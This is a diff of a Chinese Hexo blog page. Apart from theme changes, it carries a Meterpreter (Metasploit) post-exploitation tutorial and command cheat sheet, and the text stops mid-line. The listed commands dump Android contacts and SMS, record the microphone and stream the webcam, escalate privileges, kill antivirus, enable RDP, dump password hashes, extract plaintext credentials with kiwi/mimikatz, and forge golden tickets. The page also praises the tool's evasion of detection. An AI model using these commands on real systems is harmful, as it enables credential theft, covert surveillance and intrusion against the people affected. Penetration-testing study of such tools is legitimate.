@@ -18,17 +18,22 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="Meterpreter应用什么是Meterpreter   Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell">
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:type" content="website">
 <meta property="og:title" content="Hexo">
 <meta property="og:url" content="https://shiro036-joker.github.io/security/Meterpreter%E5%BA%94%E7%94%A8.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Meterpreter应用什么是Meterpreter   Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://shiro036-joker.github.io/images/redefine-og.webp">
 <meta property="article:published_time" content="2024-07-27T01:37:04.544Z">
 <meta property="article:modified_time" content="2024-07-05T01:57:39.356Z">
 <meta property="article:author" content="Shirolin">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://shiro036-joker.github.io/images/redefine-og.webp">
     
     
     <!--- Icon Part-->
@@ -40,7 +45,8 @@
     
     <title>
         
-        Shiro Scale
+            Shirolin&#39;s Blog - Redefine Your Hexo Journey.
+        
     </title>
 
     
@@ -56,7 +62,7 @@
 
     
         
-<link rel="stylesheet" href="/assets/build/styles.css">
+<link rel="stylesheet" href="/css/build/tailwind.css">
 
     
 
@@ -70,17 +76,13 @@
     
     
     
-        <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet">
     
-    
-    
-        <link href="" rel="stylesheet">
     
     
 
     <script id="hexo-configurations">
     window.config = {"hostname":"shiro036-joker.github.io","root":"/","language":"zh-CN"};
-    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":true,"family":"Noto Sans SC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap"},"english":{"enable":false,"family":"Farsan","url":"https://fonts.googleapis.com/css2?family=Farsan&display=swap"},"title":{"enable":true,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Shiro Scale","subtitle":{"text":["This is the first message","This is the second message","etc"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":150,"backing_speed":140,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":"https://github.com/Shiro036-joker/Shiro036-joker.github.io.git","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/EvanNotFound/hexo-theme-redefine","Blog":"https://ohevan.com","Friends":"https://blog.csdn.net/ysjy13?type=blog"}},"Links":{"icon":"fa-regular fa-link","submenus":{"Link1":"https://blog.csdn.net/ysjy13?type=blog","Link2":"https://blog.csdn.net/ysjy13?type=blog","Link3":"https://blog.csdn.net/ysjy13?type=blog"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":"Noto Sans SC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap"},"english":{"enable":false,"family":"Farsan","url":"https://fonts.googleapis.com/css2?family=Farsan&display=swap"},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Shirolin's Blog","subtitle":{"text":["This is the first message","This is the second message","etc"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":150,"backing_speed":140,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":"https://github.com/Shiro036-joker/Shiro036-joker.github.io.git","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/EvanNotFound/hexo-theme-redefine","Blog":"https://ohevan.com","Friends":"https://blog.csdn.net/ysjy13?type=blog"}},"Links":{"icon":"fa-regular fa-link","submenus":{"Link1":"https://blog.csdn.net/ysjy13?type=blog","Link2":"https://blog.csdn.net/ysjy13?type=blog","Link3":"https://blog.csdn.net/ysjy13?type=blog"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
     window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
     window.data = {"masonry":false};
   </script>
@@ -105,36 +107,32 @@
 <meta name="generator" content="Hexo 7.2.0"></head>
 
 
+
 <body>
-<div class="progress-bar-container">
-    
+	<div class="progress-bar-container">
+	
 
-    
-        <span class="pjax-progress-bar"></span>
-<!--        <span class="swup-progress-icon">-->
-<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
-<!--        </span>-->
-    
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
 </div>
-
-
 
 <main class="page-container" id="swup">
 
-    
+	
 
-    <div class="main-content-container">
-
-
-        <div class="main-content-header">
-            <header class="navbar-container px-6 md:px-12">
-
-    <div class="navbar-content ">
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
         <div class="left">
             
             <a class="logo-title" href="/">
                 
-                Shiro Scale
+                Shirolin&#39;s Blog
                 
             </a>
         </div>
@@ -259,7 +257,7 @@
     </div>
 
     <!-- Mobile sheet -->
-    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
         <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
             
                 
@@ -423,36 +421,37 @@
 </header>
 
 
-        </div>
+		</div>
 
-        <div class="main-content-body">
+		<div class="main-content-body transition-fade-up">
+			
 
-            
+			<div class="main-content">
+				<div class="page-template-container">
+	
 
-            <div class="main-content">
+	
 
-                
-                    <div class="page-template-container">
-    
-    
-    
-    <div class="page-template-content markdown-body">
-        
-            <h1 id="Meterpreter应用"><a href="#Meterpreter应用" class="headerlink" title="Meterpreter应用"></a>Meterpreter应用</h1><h2 id="什么是Meterpreter"><a href="#什么是Meterpreter" class="headerlink" title="什么是Meterpreter"></a>什么是Meterpreter</h2><p>   Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。</p>
+	<div class="page-template-content markdown-body">
+		
+		<h1></h1>
+		
+
+		<h1 id="Meterpreter应用"><a href="#Meterpreter应用" class="headerlink" title="Meterpreter应用"></a>Meterpreter应用</h1><h2 id="什么是Meterpreter"><a href="#什么是Meterpreter" class="headerlink" title="什么是Meterpreter"></a>什么是Meterpreter</h2><p>   Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。</p>
 <p>   最后,Meterpreter还可以简化任务创建多个会话。可以来利用这些会话进行渗透。在Metasploit Framework中，Meterpreter是一种后渗透工具，它属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型Payload。这种工具是基于“内存DLL注入”理念实现的，它能够通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。其中，攻击者与目标设备中Meterpreter的通信是通过Stager套接字实现的meterpreter作为后渗透模块有多种类型，并且命令由核心命令和扩展库命令组成，极大的丰富了攻击方式。</p>
 <p>   需要说明的meterpreter在漏洞利用成功后会发送第二阶段的代码和meterpreter服务器dll，所以在网络不稳定的情况下经常出现没有可执行命令，或者会话建立执行help之后发现缺少命令。 连上vpn又在内网中使用psexec和bind_tcp的时候经常会出现这种情况</p>
 <p>   Metasploit提供了各个主流平台的Meterpreter版本，包括Windows、Linux，同时支持x86、x64平台，另外，Meterpreter还提供了基于PHP和Java语言的实现。Meterpreter的工作模式是纯内存的，好处是启动隐藏，很难被杀毒软件监测到。不需要访问目标主机磁盘，所以也没什么入侵的痕迹。除上述外，Meterpreter还支持Ruby脚本形式的扩展。所以Ruby语言还很有必要。</p>
-<h2 id="Meterpreter的常用命令"><a href="#Meterpreter的常用命令" class="headerlink" title="Meterpreter的常用命令"></a>Meterpreter的常用命令</h2><h3 id="1-基本命令"><a href="#1-基本命令" class="headerlink" title="1.基本命令"></a>1.基本命令</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span><span class="comment"># 查看Meterpreter帮助</span></span><br><span class="line">background<span class="comment">#返回，把meterpreter后台挂起</span></span><br><span class="line">bgkill<span class="comment"># 杀死一个 meterpreter 脚本</span></span><br><span class="line">bglist<span class="comment">#提供所有正在运行的后台脚本的列表</span></span><br><span class="line">bgrun<span class="comment">#作为一个后台线程运行脚本</span></span><br><span class="line">channel<span class="comment">#显示活动频道</span></span><br><span class="line">sessions -i number <span class="comment"># 与会话进行交互，number表示第n个session,使用session -i 连接到指定序号的meterpreter会话已继续利用</span></span><br><span class="line">sesssions -k number <span class="comment">#与会话进行交互</span></span><br><span class="line">close<span class="comment"># 关闭通道</span></span><br><span class="line"><span class="built_in">exit</span><span class="comment"># 终止 meterpreter 会话</span></span><br><span class="line">quit<span class="comment"># 终止 meterpreter 会话</span></span><br><span class="line">interact <span class="built_in">id</span> <span class="comment">#切换进一个信道</span></span><br><span class="line">run<span class="comment">#执行一个已有的模块，这里要说的是输入run后按两下tab，会列出所有的已有的脚本，常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等</span></span><br><span class="line">irb<span class="comment"># 进入 Ruby 脚本模式</span></span><br><span class="line"><span class="built_in">read</span><span class="comment"># 从通道读取数据write# 将数据写入到一个通道</span></span><br><span class="line">run和bgrun<span class="comment"># 前台和后台执行以后它选定的 meterpreter 脚本</span></span><br><span class="line">use<span class="comment"># 加载 meterpreter 的扩展</span></span><br><span class="line">load/use<span class="comment">#加载模块</span></span><br><span class="line">Resource<span class="comment">#执行一个已有的rc脚本</span></span><br><span class="line">sessions <span class="comment"># 列出后台所有的会话</span></span><br><span class="line">sessions –h 查看帮助</span><br><span class="line">sessions -i &lt;ID值&gt; <span class="comment">#进入指定会话</span></span><br><span class="line">sessions -k 杀死指定会话</span><br><span class="line">background <span class="comment">#将当前会话放置后台</span></span><br><span class="line">info <span class="comment">#查看已有模块信息</span></span><br><span class="line">idletime <span class="comment">#查看目标机闲置时间</span></span><br><span class="line">reboot(linux) / shutdown(windows) <span class="comment">#重启/关机</span></span><br><span class="line">shell <span class="comment">#进入目标机cmd shell</span></span><br></pre></td></tr></table></figure></div>
+<h2 id="Meterpreter的常用命令"><a href="#Meterpreter的常用命令" class="headerlink" title="Meterpreter的常用命令"></a>Meterpreter的常用命令</h2><h3 id="1-基本命令"><a href="#1-基本命令" class="headerlink" title="1.基本命令"></a>1.基本命令</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span><span class="comment"># 查看Meterpreter帮助</span></span><br><span class="line">background<span class="comment">#返回，把meterpreter后台挂起</span></span><br><span class="line">bgkill<span class="comment"># 杀死一个 meterpreter 脚本</span></span><br><span class="line">bglist<span class="comment">#提供所有正在运行的后台脚本的列表</span></span><br><span class="line">bgrun<span class="comment">#作为一个后台线程运行脚本</span></span><br><span class="line">channel<span class="comment">#显示活动频道</span></span><br><span class="line">sessions -i number <span class="comment"># 与会话进行交互，number表示第n个session,使用session -i 连接到指定序号的meterpreter会话已继续利用</span></span><br><span class="line">sesssions -k number <span class="comment">#与会话进行交互</span></span><br><span class="line">close<span class="comment"># 关闭通道</span></span><br><span class="line"><span class="built_in">exit</span><span class="comment"># 终止 meterpreter 会话</span></span><br><span class="line">quit<span class="comment"># 终止 meterpreter 会话</span></span><br><span class="line">interact <span class="built_in">id</span> <span class="comment">#切换进一个信道</span></span><br><span class="line">run<span class="comment">#执行一个已有的模块，这里要说的是输入run后按两下tab，会列出所有的已有的脚本，常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等</span></span><br><span class="line">irb<span class="comment"># 进入 Ruby 脚本模式</span></span><br><span class="line"><span class="built_in">read</span><span class="comment"># 从通道读取数据write# 将数据写入到一个通道</span></span><br><span class="line">run和bgrun<span class="comment"># 前台和后台执行以后它选定的 meterpreter 脚本</span></span><br><span class="line">use<span class="comment"># 加载 meterpreter 的扩展</span></span><br><span class="line">load/use<span class="comment">#加载模块</span></span><br><span class="line">Resource<span class="comment">#执行一个已有的rc脚本</span></span><br><span class="line">sessions <span class="comment"># 列出后台所有的会话</span></span><br><span class="line">sessions –h 查看帮助</span><br><span class="line">sessions -i &lt;ID值&gt; <span class="comment">#进入指定会话</span></span><br><span class="line">sessions -k 杀死指定会话</span><br><span class="line">background <span class="comment">#将当前会话放置后台</span></span><br><span class="line">info <span class="comment">#查看已有模块信息</span></span><br><span class="line">idletime <span class="comment">#查看目标机闲置时间</span></span><br><span class="line">reboot(linux) / shutdown(windows) <span class="comment">#重启/关机</span></span><br><span class="line">shell <span class="comment">#进入目标机cmd shell</span></span><br></pre></td></tr></table></figure></div>
 
 
 
-<h3 id="2-常用命令"><a href="#2-常用命令" class="headerlink" title="2 常用命令"></a>2 常用命令</h3><h4 id="2-1-针对安卓手机的一些命令"><a href="#2-1-针对安卓手机的一些命令" class="headerlink" title="2.1 针对安卓手机的一些命令"></a>2.1 针对安卓手机的一些命令</h4><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">获取手机通讯录： dump_contacts</span><br><span class="line">获取短信记录：dump_sms</span><br><span class="line">控制实验手机发短信：send_sms -d 15330252525 -t</span><br><span class="line"><span class="string">&quot;hello&quot;</span></span><br><span class="line">获取实验手机GPS定位信息：geolocate</span><br><span class="line">获取实验手机Wi-Fi定位信息：wlan_geolocate</span><br><span class="line">控制实验手机录音：record_mic -d 5</span><br><span class="line">获取实验手机相机设备：webcam_list</span><br><span class="line">控制实验手机拍照 ：webcam_snap</span><br><span class="line">直播实验手机摄像头：webcam_stream</span><br></pre></td></tr></table></figure></div>
+<h3 id="2-常用命令"><a href="#2-常用命令" class="headerlink" title="2 常用命令"></a>2 常用命令</h3><h4 id="2-1-针对安卓手机的一些命令"><a href="#2-1-针对安卓手机的一些命令" class="headerlink" title="2.1 针对安卓手机的一些命令"></a>2.1 针对安卓手机的一些命令</h4><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">获取手机通讯录： dump_contacts</span><br><span class="line">获取短信记录：dump_sms</span><br><span class="line">控制实验手机发短信：send_sms -d 15330252525 -t</span><br><span class="line"><span class="string">&quot;hello&quot;</span></span><br><span class="line">获取实验手机GPS定位信息：geolocate</span><br><span class="line">获取实验手机Wi-Fi定位信息：wlan_geolocate</span><br><span class="line">控制实验手机录音：record_mic -d 5</span><br><span class="line">获取实验手机相机设备：webcam_list</span><br><span class="line">控制实验手机拍照 ：webcam_snap</span><br><span class="line">直播实验手机摄像头：webcam_stream</span><br></pre></td></tr></table></figure></div>
 
-<h4 id="2-2-针对Windows的一些命令"><a href="#2-2-针对Windows的一些命令" class="headerlink" title="2.2 针对Windows的一些命令"></a>2.2 针对Windows的一些命令</h4><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">查看进程：ps</span><br><span class="line">查看当前进程号：getpid</span><br><span class="line">查看权限：getuid</span><br><span class="line">查看系统信息：sysinfo</span><br><span class="line">查看目标机是否为虚拟机：run post/windows/gather/checkvm</span><br><span class="line">查看完整网络设置：route</span><br><span class="line">查看当前权限：getuid</span><br><span class="line">自动提权：getsystem</span><br><span class="line">关闭杀毒软件：run post/windows/manage/killav</span><br><span class="line">启动远程桌面协议：run post/windows/manage/enable_rdp</span><br><span class="line">列举当前登录的用户：run post/windows/gather/enum_logged_on_users</span><br><span class="line">查看当前应用程序：run post/windows/gather/enum_applications</span><br><span class="line">抓取目标机的屏幕截图：load espia ； screengrab</span><br><span class="line">获取相机设备：webcam_list</span><br><span class="line">控制拍照 ：webcam_snap</span><br><span class="line">直播摄像头：webcam_stream</span><br><span class="line">控制录音：record_mic</span><br><span class="line">execute <span class="comment">#在目标机中执行文件 例：execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</span></span><br><span class="line">查看当前处于目标机的那个目录：<span class="built_in">pwd</span></span><br><span class="line">查看当前目录：getlwd</span><br><span class="line">导出当前用户密码哈希 run hashdump</span><br><span class="line">用户名：SID：LM哈希：NTLM哈希:::</span><br><span class="line">也可以使用下面这个命令导出 权限更高  run windows/gather/smart_hashdump</span><br><span class="line">抓取自动登录的用户名和密码 run windows/gather/credentials/windows_autologin</span><br><span class="line">直接获取明文密码（注意这个功能需要获取系统权限 获取系统权限需要输入getsystem）</span><br><span class="line">首选终端输入 load kiwi  加载kiwi</span><br><span class="line">creds_all：列举所有凭据</span><br><span class="line">creds_kerberos：列举所有kerberos凭据</span><br><span class="line">creds_msv：列举所有msv凭据</span><br><span class="line">creds_ssp：列举所有ssp凭据</span><br><span class="line">creds_tspkg：列举所有tspkg凭据</span><br><span class="line">creds_wdigest：列举所有wdigest凭据</span><br><span class="line">dcsync：通过DCSync检索用户帐户信息</span><br><span class="line">dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID</span><br><span class="line">golden_ticket_create：创建黄金票据</span><br><span class="line">kerberos_ticket_list：列举kerberos票据</span><br><span class="line">kerberos_ticket_purge：清除kerberos票据</span><br><span class="line">kerberos_ticket_use：使用kerberos票据</span><br><span class="line">kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令</span><br><span class="line">lsa_dump_sam：dump出lsa的SAM</span><br><span class="line">lsa_dump_secrets：dump出lsa的密文</span><br><span class="line">password_change：修改密码</span><br><span class="line">wifi_list：列出当前用户的wifi配置文件</span><br><span class="line">wifi_list_shared：列出共享wifi配置文件/编码</span><br></pre></td></tr></table></figure></div>
+<h4 id="2-2-针对Windows的一些命令"><a href="#2-2-针对Windows的一些命令" class="headerlink" title="2.2 针对Windows的一些命令"></a>2.2 针对Windows的一些命令</h4><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">查看进程：ps</span><br><span class="line">查看当前进程号：getpid</span><br><span class="line">查看权限：getuid</span><br><span class="line">查看系统信息：sysinfo</span><br><span class="line">查看目标机是否为虚拟机：run post/windows/gather/checkvm</span><br><span class="line">查看完整网络设置：route</span><br><span class="line">查看当前权限：getuid</span><br><span class="line">自动提权：getsystem</span><br><span class="line">关闭杀毒软件：run post/windows/manage/killav</span><br><span class="line">启动远程桌面协议：run post/windows/manage/enable_rdp</span><br><span class="line">列举当前登录的用户：run post/windows/gather/enum_logged_on_users</span><br><span class="line">查看当前应用程序：run post/windows/gather/enum_applications</span><br><span class="line">抓取目标机的屏幕截图：load espia ； screengrab</span><br><span class="line">获取相机设备：webcam_list</span><br><span class="line">控制拍照 ：webcam_snap</span><br><span class="line">直播摄像头：webcam_stream</span><br><span class="line">控制录音：record_mic</span><br><span class="line">execute 